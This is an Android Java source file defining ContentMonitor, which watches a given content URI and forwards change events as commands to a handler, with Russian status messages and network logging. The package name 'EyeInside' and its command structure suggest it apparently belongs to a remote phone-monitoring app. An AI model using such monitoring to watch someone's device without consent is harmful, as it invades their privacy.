package com.code4bones.EyeInside;

import java.util.HashMap;

import com.code4bones.utils.NetLog;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;


public class ContentMonitor extends ContentObserver {

	public static final HashMap<String,ContentMonitor> observers = new HashMap<String,ContentMonitor>();
	public Context mContext;
	public CommandObj mCommand;
	public Handler mHandler;
	public boolean isActive;
	public String  mName;
	
	public ContentMonitor(Context context,CommandObj command,Handler handler) {
		super(handler);
		mHandler = handler;
		mContext = context;
		mCommand = command;
		isActive = false;
	}

	public static ContentMonitor getInstance(String name,Context context,CommandObj command,Handler handler) throws Exception {
		if ( observers.containsKey(name) )
			return observers.get(name);
		ContentMonitor instance = new ContentMonitor(context,command,handler);
		instance.mName = name;
		observers.put(name, instance);
		return instance;
	}
	
	public boolean setEnable(boolean fEnable,String uri) {
		ContentResolver cr = mContext.getContentResolver();
		boolean fOld = isActive;
		if ( fEnable /*&& !isActive*/ ) {
			cr.unregisterContentObserver(this);
			cr.registerContentObserver(Uri.parse(uri), true, this);
			isActive = true;
		} else /*if ( !fEnable && isActive )*/ {
			cr.unregisterContentObserver(this);
			isActive = false;
		} 
		if ( fOld != isActive ) {
			mCommand.mCommandResult = String.format("Монитор %s %s",mCommand.mCommandName,isActive?"активирован":"деактивирован");
			NetLog.v("%s : monitor is %s\r\n",mCommand.mCommandName,isActive?"activated":"deactivated");
		} else {
			NetLog.v("%s : monitor state not changed",mCommand.mCommandName);
		}
		return true;
	}
	
	@Override
    public void onChange(boolean selfChange) {
		Message msg = mHandler.obtainMessage(0,mCommand);
		
		mHandler.sendMessage(msg);
	}
}
